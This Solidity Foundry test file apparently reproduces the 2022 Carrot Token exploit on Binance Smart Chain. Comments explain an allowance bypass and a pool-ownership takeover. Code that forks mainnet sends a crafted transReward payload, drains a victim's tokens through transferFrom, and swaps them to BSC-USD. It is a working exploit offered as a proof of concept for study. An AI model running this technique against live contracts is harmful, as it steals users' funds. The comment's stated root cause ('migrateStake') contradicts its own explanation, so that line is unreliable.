// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

/*

Carrot Token was exploited on 2022-10-10 12:53:41 (UTC) on Binance Smart Chain Mainnet. 
A total of $31,318 BSC-USD was lost.

Attacker: 0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c
Attacker contract: 0x5575406ef6b15eec1986c412b9fbe144522c45ae
Vulnerable contract: 0xcFF086EaD392CcB39C49eCda8C974ad5238452aC
Pool address: 0x6863b549bf730863157318df4496ed111adfa64f
Attack tx: https://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9

The Carrot token relays on '_allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")'
to prevent unapproved token transfers, it follows an ACTION-CHECK pattern where the tokens are sent without check and 
the sub() function on the _allowances mapping verifies that the sender did had the permissions to move the tokens.
 
This final check can be avoided if the _msgSender() on the _isExcludedFromFee mapping is set to true, 
giving the _msgSender() the ability to move any user's tokens at its will. 

function transferFrom(
  address sender,
  address recipient,
  uint256 amount
) public virtual override returns (bool) {
  _beforeTransfer(_msgSender(),recipient,amount);
  
  if(_isExcludedFromFee[_msgSender()]){
      _transfer(sender, recipient, amount);
      return true;
  }
  _transfer(sender, recipient, amount);
  _approve(
      sender,
      _msgSender(),
      _allowances[sender][_msgSender()].sub(
          amount,
          "ERC20: transfer amount exceeds allowance"
      )
  );
  return true;
}

The only way to add an address to the _isExcludedFromFee mapping is if the owner of an external 
contract "Pool" is thec aller of a transfer and the counter variable is set to 0. This variable 
would act as a safety measure to stop anyone else from adding their address after the exploiter has done it.

function _beforeTransfer( address from,address to,uint256 amount) private{
  if(from.isContract())
  if(ownership(pool).owner() == from && counter ==0){
      _isExcludedFromFee[from] = true;
      counter++;
  }          
  _beforeTokenTransfer(from, to, amount);
}

The Pool address is set via the onlyOwner initPool function on the token.

function initPool(address _Pool) public onlyOwner {
    require(pool == address(0));
    pool = _Pool;
}

Finally to set the owner of the Pool Contract the transReward on the token is called with the change owner
function selector "0xbf699b4b" and the address desired, in the attack this would be "0x5575406ef6b15eec1986c412b9fbe144522c45ae"

Root cause: Insufficient access control to the migrateStake function.

Original PoC by: SunWeb3Sec 
Explanation by: Kayaba-Attribution
*/

interface ICarrot is IERC20{
    function transReward(bytes memory data) external;
}

contract ContractTest is DSTest {
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICarrot Carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IERC20 USD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22055611); // fork bsc at block 22055611
        cheats.label(address(Carrot), "Carrot");
        cheats.label(address(Router), "Router");
        cheats.label(
            address(0x6863b549bf730863157318df4496eD111aDFA64f),
            "Pool"
        );
    }

    function testExploit() public {
        console.log("Perform transReward to set owner");
        Carrot.transReward(
            hex"bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84"
        );

        console.log("Perform transferFrom");
        Carrot.transferFrom(
            0x00B433800970286CF08F34C96cf07f35412F1161,
            address(this),
            310344736073087429864760
        );

        console.log("Perform Carrot to BSC-USD swap");
        CarrotToUST();

        console.log(
            "After exploiting, BSC-USD balance:",
            USD.balanceOf(address(this)) / 1e18
        );
    }

    function migrateWithdraw(
        address,
        uint256 //callback
    ) public {}

    function CarrotToUST() internal {
        Carrot.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(Carrot);
        path[1] = address(USD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Carrot.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
